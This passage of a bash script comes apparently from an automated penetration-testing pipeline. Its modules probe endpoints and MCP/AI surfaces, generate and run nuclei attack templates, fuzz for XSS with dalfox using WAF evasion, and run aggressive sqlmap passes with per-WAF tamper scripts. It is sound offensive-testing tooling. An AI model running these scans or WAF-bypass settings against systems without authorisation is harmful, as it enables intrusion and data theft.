    if [ "$ENDPOINT_CONSOLIDATION_ENABLED" != "true" ]; then
        log_warn "Endpoint consolidation disabled (ENDPOINT_CONSOLIDATION_ENABLED=false)"
        echo "{\"module\":\"endpoint_consolidation\",\"status\":\"disabled\",\"total_endpoints\":0,\"duration_seconds\":0}" > "$output_file"
        echo "$output_file"
        return 0
    fi

    local script_path="$PROJECT_ROOT/discovery/endpoint_consolidator.py"
    if [ ! -f "$script_path" ] || ! command -v python3 &>/dev/null; then
        log_warn "discovery/endpoint_consolidator.py or python3 missing — skipping"
        echo "{\"module\":\"endpoint_consolidation\",\"status\":\"skipped\",\"total_endpoints\":0,\"duration_seconds\":0}" > "$output_file"
        echo "$output_file"
        return 0
    fi

    local py_args=("$target"
        "--scan-dir" "$OUTPUT_DIR"
        "--max-probe" "$ENDPOINT_MAX_PROBE"
        "--max-method-probe" "$ENDPOINT_MAX_METHOD_PROBE"
        "--slug-threshold" "$ENDPOINT_SLUG_THRESHOLD"
        "--httpx" "$HTTPX")
    command -v "$HTTPX" &>/dev/null || py_args+=("--no-probe")
    { [ "$ENDPOINT_NO_METHOD_PROBE" = "true" ] || [ "$ENDPOINT_MAX_METHOD_PROBE" = "0" ]; } \
        && py_args+=("--no-method-probe")

    log_info "Consolidating discovered endpoints (dirsearch + crawl + runtime API)..."
    if run_tool endpoint_consolidation python3 "$script_path" "${py_args[@]}"; then
        log_info "Endpoint consolidation completed"
    else
        log_warn "Endpoint consolidation exited non-zero (partial results may exist)"
    fi

    local total=0
    total=$(count_lines "$base_dir/discovered_endpoints.jsonl")
    log_info "Consolidated endpoints: $total"
    update_statistics "discovered_endpoints" "$total"

    # Emit the non-GET method map so api_security / apisec can target POST /
    # PUT / DELETE surfaces without re-running OPTIONS. Silently no-op when
    # the consolidator failed or produced no methods field.
    if [ -f "$PROJECT_ROOT/discovery/method_map.py" ] && command -v python3 &>/dev/null; then
        python3 "$PROJECT_ROOT/discovery/method_map.py" "$OUTPUT_DIR" 2>&1 | \
            grep -E "^\[method-map\]" | while read -r ln; do log_info "$ln"; done || true
    fi

    local end_time=$(date +%s)
    if [ -f "$base_dir/discovered_endpoints_summary.json" ]; then
        python3 - "$base_dir/discovered_endpoints_summary.json" "$output_file" "$((end_time - start_time))" << 'MERGE_SUMMARY' 2>/dev/null || \
            echo "{\"module\":\"endpoint_consolidation\",\"status\":\"completed\",\"total_endpoints\":$total,\"duration_seconds\":$((end_time - start_time))}" > "$output_file"
import json, sys
summ = json.load(open(sys.argv[1]))
summ["status"] = "completed"
summ["duration_seconds"] = int(sys.argv[3])
json.dump(summ, open(sys.argv[2], "w"), indent=2)
MERGE_SUMMARY
    else
        echo "{\"module\":\"endpoint_consolidation\",\"status\":\"completed\",\"total_endpoints\":$total,\"duration_seconds\":$((end_time - start_time))}" > "$output_file"
    fi
    log_info "Endpoint consolidation module complete"
    echo "$output_file"
}

###################################################################################################
# MODULE 8D: MCP / AI SURFACE PROBE (discovery/mcp_ai_probe.py)
#
# Runs just BEFORE Module 8B (endpoint_consolidation) so its confirmed MCP/AI
# endpoints are folded into the URL Inventory like any other discovery source.
# Passive marking + safe-GET fingerprint + read-only MCP initialize/tools-list
# handshake + tool-poisoning/posture findings. Writes:
#   08_directory_discovery/mcp_ai_endpoints.jsonl  (consumed by 8B as a source)
#   08_directory_discovery/mcp_ai_findings.jsonl   (posture/poisoning findings)
# Default: passive + safe-GET + read-only handshake. MCP_AI_ACTIVE=true adds a
# single benign generation request to confirm open/unauth inference. Fully
# additive — MCP_AI_DISCOVERY_ENABLED=false makes it a clean no-op.
###################################################################################################

MCP_AI_DISCOVERY_ENABLED="${MCP_AI_DISCOVERY_ENABLED:-true}"
MCP_AI_ACTIVE="${MCP_AI_ACTIVE:-false}"
MCP_AI_MAX_HOSTS="${MCP_AI_MAX_HOSTS:-60}"

module_mcp_ai_probe() {
    local target="$1"
    log_section "MODULE 8D: MCP / AI Surface Probe"

    local base_dir="$OUTPUT_DIR/08_directory_discovery"
    mkdir -p "$base_dir"
    local output_file="$base_dir/$(make_iso_filename "$target" "mcp_ai_probe" "results")"

    if [ "$MCP_AI_DISCOVERY_ENABLED" != "true" ]; then
        log_warn "MCP/AI surface probe disabled (MCP_AI_DISCOVERY_ENABLED=false)"
        echo "{\"module\":\"mcp_ai_probe\",\"status\":\"disabled\",\"endpoints\":0,\"findings\":0,\"duration_seconds\":0}" > "$output_file"
        echo "$output_file"
        return 0
    fi

    local script_path="$PROJECT_ROOT/discovery/mcp_ai_probe.py"
    if [ ! -f "$script_path" ] || ! command -v python3 &>/dev/null; then
        log_warn "discovery/mcp_ai_probe.py or python3 missing — skipping"
        echo "{\"module\":\"mcp_ai_probe\",\"status\":\"skipped\",\"endpoints\":0,\"findings\":0,\"duration_seconds\":0}" > "$output_file"
        echo "$output_file"
        return 0
    fi

    local start_time=$(date +%s)
    local ep_out="$base_dir/mcp_ai_endpoints.jsonl"
    local find_out="$base_dir/mcp_ai_findings.jsonl"
    local py_args=("--target" "$target" "--scan-dir" "$OUTPUT_DIR"
        "--endpoints-out" "$ep_out" "--findings-out" "$find_out"
        "--max-hosts" "$MCP_AI_MAX_HOSTS")
    [ "$MCP_AI_ACTIVE" = "true" ] && py_args+=("--active")

    log_info "Probing MCP/AI surfaces (active=${MCP_AI_ACTIVE})..."
    if run_tool mcp_ai_probe python3 "$script_path" "${py_args[@]}"; then
        log_info "MCP/AI surface probe completed"
    else
        log_warn "MCP/AI surface probe exited non-zero (partial results may exist)"
    fi

    local n_ep=0 n_find=0
    n_ep=$(count_lines "$ep_out")
    n_find=$(count_lines "$find_out")
    log_info "MCP/AI endpoints: $n_ep; findings: $n_find"
    update_statistics "mcp_ai_endpoints" "$n_ep"

    local end_time=$(date +%s)
    echo "{\"module\":\"mcp_ai_probe\",\"status\":\"completed\",\"endpoints\":$n_ep,\"findings\":$n_find,\"active\":$MCP_AI_ACTIVE,\"duration_seconds\":$((end_time - start_time))}" > "$output_file"
    echo "$output_file"
}

###################################################################################################
# ATTACK FORMATION (discovery/recon_attack_synth.py) — the final offensive phase.
# Runs AFTER the full pipeline (all recon + all first-pass tests), so it fires against the
# complete surface. Two steps in one stage: (1) SYNTHESIZE nuclei-validated custom templates
# from attack_routing + tech_manifest (exposure / version-swap / methods / idor / graphql +
# DAST fuzz lanes); (2) EXECUTE them and append findings to nuclei_results.txt. The next
# stage (internet_intel) then validates the expanded set, and attack_paths chains it.
###################################################################################################
module_attack_synth() {
    local target="$1"
    log_section "ATTACK FORMATION: Recon-Driven Synthesis + Execution"

    local synth_dir="$OUTPUT_DIR/08d_attack_synth"
    mkdir -p "$synth_dir"
    local output_file="$synth_dir/$(make_iso_filename "$target" "attack_synth" "results")"

    local routing="$OUTPUT_DIR/08_directory_discovery/attack_routing.jsonl"
    if [ ! -s "$routing" ]; then
        log_warn "No attack_routing.jsonl — run endpoint_consolidation first; skipping synthesis"
        echo "{\"module\":\"attack_synth\",\"status\":\"skipped\",\"templates\":0}" > "$output_file"
        echo "$output_file"
        return 0
    fi

    local script_path="$PROJECT_ROOT/discovery/recon_attack_synth.py"
    if [ ! -f "$script_path" ] || ! command -v python3 &>/dev/null; then
        log_warn "discovery/recon_attack_synth.py or python3 missing — skipping"
        echo "{\"module\":\"attack_synth\",\"status\":\"skipped\",\"templates\":0}" > "$output_file"
        echo "$output_file"
        return 0
    fi

    local synth_args=("$OUTPUT_DIR" "--out" "$synth_dir" "--summary"
        "--max-hosts" "${SYNTH_MAX_HOSTS:-25}"
        "--per-host-cap" "${SYNTH_PER_HOST_CAP:-60}")
    [ "${SYNTH_ALLOW_MUTATION:-false}" = "true" ] && synth_args+=("--allow-mutation")
    # Opt-in AI augmentation (proposes extra templates + triages). No key ⇒ silent no-op.
    [ "${SYNTH_AI:-false}" = "true" ] && synth_args+=("--ai")

    log_info "Synthesizing recon-driven attack templates..."
    if run_tool attack_synth python3 "$script_path" "${synth_args[@]}"; then
        log_info "Attack synthesis completed"
    else
        log_warn "Attack synthesis exited non-zero (partial templates may exist)"
    fi

    local ntmpl=0
    [ -f "$synth_dir/synth_manifest.json" ] && \
        ntmpl=$(python3 -c "import json; d=json.load(open('$synth_dir/synth_manifest.json')); print(sum(d.get('template_counts',{}).values()))" 2>/dev/null || echo 0)
    log_info "Synthesized templates: $ntmpl"
    update_statistics "synth_templates" "$ntmpl"

    # ── Execute the synthesized attacks — the final offensive wave ────────────
    # Runs AFTER the full pipeline. Findings append to nuclei_results.txt so
    # internet_intel validates them and attack_paths chains them.
    #
    # Performance: the old version ran `nuclei -u <host> -t <dir>` in a serial
    # for-loop over up to 25 hosts — each invocation recompiled templates from
    # scratch (~15-30s startup per host). Now we build ONE target list of all
    # synth hosts and run nuclei ONCE with all per-host template dirs, cutting
    # template compile overhead from 25× to 1×.
    local synth_tdir="$synth_dir/generated-templates"
    local nd12="$OUTPUT_DIR/12_nuclei_scanning"; mkdir -p "$nd12"
    local synth_findings=0
    local SYNTH_MAX="${NUCLEI_SYNTH_MAX_TIME:-1200}"  # 20 min cap
    if [ -d "$synth_tdir" ] && command -v "$NUCLEI" &>/dev/null; then
        : > "$nd12/synth_results.txt"

        # Build a single target list + collect all template dirs for one run.
        local synth_targets="$nd12/.synth_targets.tmp.txt"
        local synth_tdirs=()
        : > "$synth_targets"
        for hd in "$synth_tdir"/*/; do
            [ -d "$hd" ] || continue
            local shost; shost="$(basename "$hd")"; [ "$shost" = "fuzz" ] && continue
            echo "https://$shost" >> "$synth_targets"
            synth_tdirs+=("-t" "$hd")
        done
        local _nuclei_extra=(-H "User-Agent: $HUMAN_USER_AGENT")
        local _cookie_hdr=$(session_cookie_header)
        [ -n "$_cookie_hdr" ] && _nuclei_extra+=(-H "Cookie: $_cookie_hdr")
        [ -n "$TLS_IMPERSONATE_FLAG" ] && _nuclei_extra+=("$TLS_IMPERSONATE_FLAG")
        if [ -s "$synth_targets" ] && [ ${#synth_tdirs[@]} -gt 0 ]; then
            log_info "Synth targeted: $(count_lines "$synth_targets") hosts, ${#synth_tdirs[@]} template args (cap ${SYNTH_MAX}s)"
            run_tool_timeout "$SYNTH_MAX" nuclei_synth $NUCLEI -l "$synth_targets" \
                "${synth_tdirs[@]}" \
                "${_nuclei_extra[@]}" \
                -severity info,low,medium,high,critical \
                -o "$nd12/synth_results.txt" -j -rl 150 \
                -max-time "${SYNTH_MAX}s" -duc || true
        fi
        rm -f "$synth_targets"

        # DAST fuzzing lanes — each lane has its own template + scoped URL list.
        local DAST_MAX="${NUCLEI_DAST_MAX_TIME:-900}"  # 15 min cap per lane
        for lane in xss-reflect sqli-error lfi-traversal ssrf-oob; do
            local stl="$synth_dir/targets/${lane}_urls.txt"
            local stf="$synth_tdir/fuzz/${lane}.yaml"
            [ -s "$stl" ] && [ -f "$stf" ] || continue
            log_info "Synth DAST [$lane]: $(count_lines "$stl") scoped URL(s) (cap ${DAST_MAX}s)"
            run_tool_timeout "$DAST_MAX" nuclei_dast $NUCLEI -l "$stl" -t "$stf" -dast \
                "${_nuclei_extra[@]}" \
                -o "$nd12/synth_results.txt" -j -rl 100 \
                -max-time "${DAST_MAX}s" -duc || true
        done
        if [ -s "$nd12/synth_results.txt" ]; then
            cat "$nd12/synth_results.txt" >> "$nd12/nuclei_results.txt" 2>/dev/null || true
            [ -f "$nd12/full_results.txt" ] && cat "$nd12/synth_results.txt" >> "$nd12/full_results.txt" 2>/dev/null || true
            synth_findings=$(count_lines "$nd12/synth_results.txt")
            log_info "Synth attack wave: $synth_findings finding(s) → merged for validation + chaining"
            update_statistics "synth_findings" "$synth_findings"
        fi
    fi

    echo "{\"module\":\"attack_synth\",\"status\":\"completed\",\"templates\":$ntmpl,\"findings\":$synth_findings}" > "$output_file"
    echo "$output_file"
}

module_xss_testing() {
    local target="$1"
    log_section "MODULE 13: XSS Testing"
    
    local start_time=$(date +%s)
    local output_file="$OUTPUT_DIR/13_xss_testing/$(make_iso_filename "$target" "xss_testing" "results")"
    
    local urls_file="$OUTPUT_DIR/09_crawling/all_urls.txt"
    [ ! -f "$urls_file" ] && { log_info "No URLs to test"; return 0; }
    
    log_info "Extracting XSS candidates with gf patterns..."
    
    local xss_candidates="$OUTPUT_DIR/13_xss_testing/xss_candidates.txt"
    > "$xss_candidates"
    
    if command -v gf &>/dev/null; then
        $GF xss "$urls_file" > "$xss_candidates" 2>/dev/null || true
    else
        # Fallback: grep for common XSS patterns
        grep -iE '(\?|&)(id|page|name|search|q|lang|input|text|value|src|url)=.*' "$urls_file" > "$xss_candidates" 2>/dev/null || true
    fi

    # Primary feed: attack_routing.jsonl (Module 8B) — these are pre-classified,
    # scope-filtered URLs already confirmed to be XSS candidates by url_classify.
    # Use sample_url (the concrete, probe-able URL, not the {token}-templated key).
    local routing_file="$OUTPUT_DIR/08_directory_discovery/attack_routing.jsonl"
    if [ -f "$routing_file" ]; then
        python3 - "$routing_file" >> "$xss_candidates" << 'ROUTING_XSS'
import json, sys
for line in open(sys.argv[1]):
    try:
        r = json.loads(line)
        if r.get("attack") == "xss":
            u = r.get("url") or r.get("template", "")
            if u: print(u)
    except Exception: pass
ROUTING_XSS
        log_info "XSS candidates from attack_routing.jsonl: $(count_lines "$xss_candidates")"
    fi

    # Also include confirmed-live API endpoints from the API intel engine —
    # these have query params that gf/grep may have missed if they only appeared
    # after api_security/apisec.py probing (e.g. ?search=, ?q=, ?filter= on /api/* paths).
    local api_snapshot="$OUTPUT_DIR/16_api_security/intel/endpoints_snapshot.jsonl"
    if [ -f "$api_snapshot" ]; then
        python3 - "$api_snapshot" >> "$xss_candidates" << 'API_XSS'
import json, sys, re
XSS_RE = re.compile(r'[?&](search|q|query|name|text|input|value|src|url|redirect|page|lang|id|title|msg|message|comment|content)=', re.I)
for line in open(sys.argv[1]):
    try:
        ep = json.loads(line)
        url = ep.get('url','')
        if url and XSS_RE.search(url): print(url)
    except Exception: pass
API_XSS
    fi

    sort -u "$xss_candidates" -o "$xss_candidates"
    local candidate_count=$(count_lines "$xss_candidates")
    log_info "XSS candidates: $candidate_count (including API endpoints)"
    
    # Run dalfox for XSS testing
    local xss_results="$OUTPUT_DIR/13_xss_testing/xss_results.txt"
    > "$xss_results"
    
    if command -v dalfox &>/dev/null && [ -s "$xss_candidates" ]; then
        log_info "Running dalfox XSS testing..."
        # -t was dalfox's old thread-count shorthand; current dalfox renamed it
        # to -w/--worker and treats -t as unknown, so every invocation failed
        # with "unknown shorthand flag: 't'" (exit 0, zero findings, silently).
        run_tool_timeout "${DALFOX_TIMEOUT:-3600}" dalfox $DALFOX file "$xss_candidates" -o "$xss_results" -w 10 --waf-evasion || true
    else
        log_warn "dalfox not available or no candidates"
    fi
    
    local vulns_found=0
    [ -f "$xss_results" ] && vulns_found=$(count_lines "$xss_results")
    
    log_info "XSS vulnerabilities found: $vulns_found"
    
    local end_time=$(date +%s)
    cat > "$output_file" << EOF
{
  "module": "xss_testing",
  "candidates": $candidate_count,
  "vulnerabilities": $vulns_found,
  "duration_seconds": $((end_time - start_time))
}
EOF
    
    log_info "XSS testing completed"
    echo "$output_file"
}
###################################################################################################
# MODULE 15: SQL INJECTION TESTING (sqlmap — WAF-aware safe detection)
###################################################################################################

SQLI_MAX_URLS="${SQLI_MAX_URLS:-50}"
# Hard wall-clock cap on a SINGLE sqlmap invocation (seconds). Without this a
# time-based-blind run can hang for many minutes per URL. `timeout` kills it.
SQLI_PER_RUN_TIMEOUT="${SQLI_PER_RUN_TIMEOUT:-600}"
# Total wall-clock budget for the whole SQLi module (seconds). Once exceeded,
# remaining URLs are skipped so the pipeline can never stall for hours here.
SQLI_MODULE_BUDGET="${SQLI_MODULE_BUDGET:-5400}"
# Techniques for the baseline pass. AGGRESSIVE default INCLUDES 'T' (time-based
# blind) — the most common real-world SQLi variant, and the reason the per-run
# cap is 600s (time-based sleeps out every payload). Set SQLI_BASELINE_TECHNIQUE=BEUS
# to drop back to the fast, error/boolean-only baseline.
SQLI_BASELINE_TECHNIQUE="${SQLI_BASELINE_TECHNIQUE:-BEUST}"
SQLI_ENABLE_TIME_BASED="${SQLI_ENABLE_TIME_BASED:-true}"

# Map WAF vendors to sqlmap tamper scripts that work best against them
_sqli_tamper_for_waf() {
    local waf="$1"
    case "$(echo "$waf" | tr '[:upper:]' '[:lower:]')" in
        cloudflare)    echo "between,randomcase,space2comment" ;;
        akamai)        echo "space2hash,between,randomcase" ;;
        imperva|incapsula) echo "space2mssqlhash,randomcase,charencode" ;;
        f5*|big-ip)    echo "space2mssqlblank,percentage,randomcase" ;;
        aws*|awswaf)   echo "space2comment,between,charencode" ;;
        barracuda)     echo "space2plus,randomcase,between" ;;
        fortinet|fortiweb) echo "space2morehash,randomcase,charencode" ;;
        modsecurity)   echo "space2comment,charencode,between" ;;
        sucuri)        echo "between,randomcase,space2comment" ;;
        envoy)         echo "between,randomcase" ;;
        *)             echo "between,randomcase,space2comment" ;;
    esac
}

# Pick a `timeout` binary if one exists (coreutils `timeout` or `gtimeout` on
# macOS via brew). Empty string ⇒ fall back to the bash-native watchdog below.
_sqli_timeout_bin() {
    if command -v timeout >/dev/null 2>&1; then echo "timeout"
    elif command -v gtimeout >/dev/null 2>&1; then echo "gtimeout"
    else echo ""; fi
}

# Run a single sqlmap pass; returns 0 if injection found, non-zero otherwise
# (including when the run is killed for exceeding SQLI_PER_RUN_TIMEOUT). The hard
# cap is enforced either by a `timeout` binary when present, or a pure-bash
# watchdog when it is not (macOS ships no `timeout`), so a time-based-blind probe
# can NEVER hang the module.
_sqli_run_sqlmap() {
    local url="$1" run_dir="$2" pass_name="$3"
    shift 3
    local extra_args=("$@")
    local log="$run_dir/${pass_name}.log"

    local -a sqlmap_cmd=(sqlmap -u "$url"
        --batch --level=4 --risk=3 --timeout=10 --retries=1 --threads=4
        --output-dir="$run_dir" --flush-session --drop-set-cookie
        --random-agent --fresh-queries "${extra_args[@]}")

    local rc=0 to_bin
    to_bin=$(_sqli_timeout_bin)
    if [ -n "$to_bin" ]; then
        # -k 10: SIGKILL 10s after SIGTERM if sqlmap ignores the term.
        "$to_bin" -k 10 "$SQLI_PER_RUN_TIMEOUT" "${sqlmap_cmd[@]}" \
            2>/dev/null > "$log"
        rc=$?
    else
        # Bash-native watchdog: launch sqlmap, poll, then TERM→KILL on cap.
        "${sqlmap_cmd[@]}" 2>/dev/null > "$log" &
        local sm_pid=$!
        local waited=0
        while kill -0 "$sm_pid" 2>/dev/null; do
            if [ "$waited" -ge "$SQLI_PER_RUN_TIMEOUT" ]; then
                kill -TERM "$sm_pid" 2>/dev/null
                sleep 5
                kill -KILL "$sm_pid" 2>/dev/null
                rc=124
                break
            fi
            sleep 3
            waited=$(( waited + 3 ))
        done
        # Reap and capture sqlmap's own exit status when it finished on its own.
        if [ "$rc" -ne 124 ]; then
            wait "$sm_pid" 2>/dev/null; rc=$?
        else
            wait "$sm_pid" 2>/dev/null
        fi
    fi

    # 124 = watchdog/`timeout` hit the cap; 137 = SIGKILL. Either way the run was
    # aborted, not confirmed — log it and report no finding.
    if [ "$rc" -eq 124 ] || [ "$rc" -eq 137 ]; then
        echo "[arise] sqlmap pass '$pass_name' hit ${SQLI_PER_RUN_TIMEOUT}s cap and was killed" >> "$log"
        return 1
    fi

    # Check for confirmed injection — sqlmap emits "the following injection point"
    # on a real find. NEVER match "injectable" alone: the negative output
    # "do not appear to be injectable" contains that word and causes false positives.
    # If sqlmap confirmed injection, trust it — even if a WAF was detected, the
    # injection was confirmed THROUGH the WAF.
    if grep -q "the following injection point" "$log" 2>/dev/null \
       && ! grep -q "do not appear to be injectable" "$log" 2>/dev/null; then
        return 0
    fi
    return 1
}

###################################################################################################
# MODULE 20: API DEEP DISCOVERY (Headless Interception + Form Detection + Method Enumeration)
###################################################################################################

module_api_deep_discovery() {
    local target="$1"
    log_section "MODULE 20: API Deep Discovery (Headless Interception)"

    local start_time=$(date +%s)
    local base_dir="$OUTPUT_DIR/20_api_deep_discovery"
    mkdir -p "$base_dir"
    local output_file="$base_dir/$(make_iso_filename "$target" "api_deep_discovery" "results")"

    local http_hosts="$OUTPUT_DIR/04_http_discovery/http_hosts.txt"
    if [ ! -s "$http_hosts" ]; then
        log_warn "No HTTP hosts available for API deep discovery"
        cat > "$output_file" << EOF
{
  "module": "api_deep_discovery",
  "status": "no_targets",
  "duration_seconds": $(($(date +%s) - start_time))
}
EOF
        echo "$output_file"
        return 0
    fi

    if ! command -v katana &>/dev/null; then
        log_warn "katana is required for API deep discovery (headless mode)"
        cat > "$output_file" << EOF
{
  "module": "api_deep_discovery",
  "status": "katana_unavailable",
  "duration_seconds": $(($(date +%s) - start_time))
}
EOF
        echo "$output_file"
        return 0
    fi

    local script_path="$PROJECT_ROOT/api_security/api_deep_discovery.py"
    if [ ! -f "$script_path" ]; then
        log_error "api_security/api_deep_discovery.py not found at $script_path"
        return 1
    fi

    local crawled_urls="$OUTPUT_DIR/09_crawling/all_urls.txt"
    local js_dir="$OUTPUT_DIR/09_crawling/js_downloads"

    local py_args=(
        "--http-hosts" "$http_hosts"
        "--output-dir" "$base_dir"
        "--depth" "5"
        "--concurrency" "10"
        "--rate" "50"
        "--method-probe"
        "--method-probe-max" "100"
        "--form-fetch-max" "100"
    )

    [ -s "$crawled_urls" ] && py_args+=("--crawled-urls" "$crawled_urls")
    [ -d "$js_dir" ] && py_args+=("--js-dir" "$js_dir")
    [ -f "$MANIFEST_FILE" ] && py_args+=("--manifest" "$MANIFEST_FILE")

    log_info "Running API deep discovery (headless browser interception)..."
    if run_tool api_deep_discovery python3 "$script_path" "${py_args[@]}"; then
        log_info "API deep discovery completed successfully"
    else
        log_warn "API deep discovery exited with errors (partial results may exist)"
    fi

    # MODULE 20.2: Input-Functions Discovery (CDP / Playwright). Drives real
    # Chrome to record forms, file-uploads and runtime fetch/XHR submit targets,
    # writing input_functions.jsonl for Module 8B to fold into the URL Inventory.
    # Env: INPUT_DISCOVERY_ENABLED=false to skip; INPUT_DISCOVERY_MAX_PAGES caps
    # pages visited; INPUT_DISCOVERY_CHANNEL selects the Chrome channel.
    local input_disc="${INPUT_DISCOVERY_ENABLED:-true}"
    local input_script="$PROJECT_ROOT/discovery/input_discovery.py"
    if [ "$input_disc" = "true" ] && [ -f "$input_script" ]; then
        # Start ONE app-owned dedicated headless Chrome; input_discovery connects
        # to it over CDP (auto-discovered via $OUTPUT_DIR/.arise_chrome.json)
        # instead of cold-launching its own browser.
        local chrome_svc="$PROJECT_ROOT/recon/chrome_service.py"
        local chrome_started="no"
        if [ -f "$chrome_svc" ]; then
            if python3 "$chrome_svc" start --scan-dir "$OUTPUT_DIR" >/dev/null 2>&1; then
                chrome_started="yes"
                # Safety net: stop the dedicated Chrome even if the pipeline is
                # interrupted (Ctrl-C) or errors out before the normal stop below.
                trap 'python3 "'"$chrome_svc"'" stop --scan-dir "'"$OUTPUT_DIR"'" >/dev/null 2>&1 || true' EXIT INT TERM
                log_info "Dedicated headless Chrome started (shared via CDP)"
            else
                log_warn "Dedicated Chrome unavailable; input_discovery will self-launch"
            fi
        fi

        log_info "Running input-functions discovery (CDP headless Chrome)..."
        run_tool input_discovery python3 "$input_script" "$target" \
            --scan-dir "$OUTPUT_DIR" \
            --max-pages "${INPUT_DISCOVERY_MAX_PAGES:-150}" \
            --channel "${INPUT_DISCOVERY_CHANNEL:-chrome}" \
            || log_warn "input-functions discovery exited non-zero (continuing)"

        # MODULE 20.3: Input Probe — oracle-confirmed active testing of the
        # discovered input functions (reflected-XSS/SQLi/SSTI/SSRF/upload/mass-
        # assignment/…). Emits ONLY response-confirmed findings into
        # 16_api_security/input_probe_findings.jsonl (shown in API Security tab).
        # Env: INPUT_PROBE_ENABLED=false to skip; caps via INPUT_PROBE_MAX_*.
        local probe_enabled="${INPUT_PROBE_ENABLED:-true}"
        local probe_script="$PROJECT_ROOT/discovery/input_probe.py"
        if [ "$probe_enabled" = "true" ] && [ -f "$probe_script" ]; then
            log_info "Running input probe (oracle-confirmed active testing)..."
            run_tool input_probe python3 "$probe_script" "$target" \
                --scan-dir "$OUTPUT_DIR" \
                --max-endpoints "${INPUT_PROBE_MAX_ENDPOINTS:-150}" \
                --max-requests "${INPUT_PROBE_MAX_REQUESTS:-1200}" \
                --rate "${INPUT_PROBE_RATE:-20}" \
                || log_warn "input probe exited non-zero (continuing)"
        fi

        # Shut down the app-owned dedicated Chrome we started for this module.
        if [ "$chrome_started" = "yes" ]; then
            python3 "$chrome_svc" stop --scan-dir "$OUTPUT_DIR" >/dev/null 2>&1 || true
            trap - EXIT INT TERM   # clear the interruption safety-net trap
            log_info "Dedicated headless Chrome stopped"
        fi
    fi

    # Feed discovered SQLi targets back into the pipeline for module 15
    local sqli_targets="$base_dir/sqli_targets.txt"
    if [ -s "$sqli_targets" ]; then
        local sqli_count=$(count_lines "$sqli_targets")
        log_info "Feeding $sqli_count SQLi targets from deep discovery into pipeline"
        # Append to crawled URLs so SQLi module picks them up
        cat "$sqli_targets" >> "$OUTPUT_DIR/09_crawling/all_urls.txt"
        sort -u "$OUTPUT_DIR/09_crawling/all_urls.txt" -o "$OUTPUT_DIR/09_crawling/all_urls.txt"
    fi

    # Feed injection targets for XSS module
    local injection_targets="$base_dir/injection_targets.txt"
    if [ -s "$injection_targets" ]; then
        local inj_count=$(count_lines "$injection_targets")
        log_info "Feeding $inj_count injection targets from deep discovery into pipeline"
        cat "$injection_targets" >> "$OUTPUT_DIR/09_crawling/all_urls.txt"
        sort -u "$OUTPUT_DIR/09_crawling/all_urls.txt" -o "$OUTPUT_DIR/09_crawling/all_urls.txt"
    fi

    # Read results summary
    local results_json="$base_dir/results.json"
    if [ -f "$results_json" ]; then
        cp "$results_json" "$output_file"
    else
        cat > "$output_file" << EOF
{
  "module": "api_deep_discovery",
  "status": "completed_no_summary",
  "duration_seconds": $(($(date +%s) - start_time))
}
EOF
    fi

    local end_time=$(date +%s)
    log_info "API deep discovery duration: $((end_time - start_time))s"
    echo "$output_file"
}

###################################################################################################
# MODULE 20.1: API-AWARE SQL INJECTION TESTING (sqlmap on discovered API URLs)
#
# Consumes Module 20's (api_deep_discovery) injectable API URLs — full, valid
# API URLs built from headless crawl, XHR interception, JS extraction and REST
# path params — and drives the EXISTING sqlmap engine (_sqli_run_sqlmap +
# WAF-aware multi-pass, shared with Module 15) against them. A liveness/soft-404
# gate first drops constructed URLs that don't resolve to a live parameterized
# endpoint, so sqlmap isn't wasted on dead/404 targets. Confirmed injections are
# written with source "SQLi Testing" (distinct API template) so they flow into
# the dashboard Vulns table and risk scoring exactly like Module 15 findings.
###################################################################################################

API_SQLI_ENABLED="${API_SQLI_ENABLED:-true}"
API_SQLI_MAX_URLS="${API_SQLI_MAX_URLS:-40}"
API_SQLI_LIVENESS="${API_SQLI_LIVENESS:-true}"

# Liveness + soft-404 gate for one URL. Returns 0 if the URL looks like a live,
# testable endpoint; 1 if it should be skipped. Per-origin soft-404 baseline is
# cached in $cache_dir (plain files, no associative arrays — bash 3.2 safe).
_api_sqli_liveness_ok() {
    local url="$1" cache_dir="$2"
    [ "$API_SQLI_LIVENESS" != "true" ] && return 0
    command -v curl &>/dev/null || return 0   # no curl → don't gate

    local tmp_body code body_len
    tmp_body=$(mktemp)
    code=$(curl -sk -m 12 -o "$tmp_body" -w '%{http_code}' \
        -A "Mozilla/5.0 ARISE-APISQLi" "$url" 2>/dev/null)
    body_len=$(wc -c < "$tmp_body" 2>/dev/null | tr -d ' ')
    rm -f "$tmp_body"
    code=${code:-000}
    body_len=${body_len:-0}

    # Hard-dead / error responses → skip
    case "$code" in
        000|404|410|500|501|502|503|504) return 1 ;;
    esac

    # Soft-404 detection: compare against a random-path baseline on the same
    # origin. Baseline (code + body length) cached per origin.
    local base_url base_key softfile softcodefile soft_len soft_code
    base_url=$(printf '%s' "$url" | sed -E 's|^(https?://[^/]+).*|\1|')
    base_key=$(printf '%s' "$base_url" | md5sum | cut -c1-12)
    softfile="$cache_dir/softbase_$base_key"
    softcodefile="$cache_dir/softcode_$base_key"
    if [ ! -f "$softfile" ]; then
        local rand_url sb
        rand_url="$base_url/arise_soft404_$(date +%s%N | md5sum | cut -c1-16)"
        sb=$(mktemp)
        curl -sk -m 10 -o "$sb" -w '%{http_code}' \
            -A "Mozilla/5.0 ARISE-APISQLi" "$rand_url" 2>/dev/null > "$softcodefile"
        wc -c < "$sb" 2>/dev/null | tr -d ' ' > "$softfile"
        rm -f "$sb"
    fi
    soft_len=$(cat "$softfile" 2>/dev/null || echo -1)
    soft_code=$(cat "$softcodefile" 2>/dev/null || echo 000)
    soft_len=${soft_len:--1}
    soft_code=${soft_code:-000}

    # If a known-bogus path also returns 200 with a body length within 5% of
    # ours, this origin serves soft-404s → the URL is not a distinguishable
    # live endpoint, so skip it.
    if [ "$soft_code" = "200" ] && [ "$code" = "200" ] && [ "$soft_len" -gt 0 ]; then
        local diff pct
        diff=$(( body_len - soft_len )); [ "$diff" -lt 0 ] && diff=$(( -diff ))
        pct=$(( diff * 100 / soft_len ))
        [ "$pct" -le 5 ] && return 1
    fi
    return 0
}

module_api_sqli_testing() {
    local target="$1"
    log_section "MODULE 20.1: API-Aware SQL Injection Testing (sqlmap on discovered API URLs)"

    local start_time=$(date +%s)
    local base_dir="$OUTPUT_DIR/20.1_api_sqli_testing"
    mkdir -p "$base_dir"
    local output_file="$base_dir/$(make_iso_filename "$target" "api_sqli_testing" "results")"
    local results_jsonl="$base_dir/sqli_results.jsonl"
    > "$results_jsonl"

    if [ "$API_SQLI_ENABLED" != "true" ]; then
        log_warn "API SQLi testing disabled (API_SQLI_ENABLED=false)"
        echo '{"module":"api_sqli_testing","status":"disabled","candidates":0,"findings":0,"duration_seconds":0}' > "$output_file"
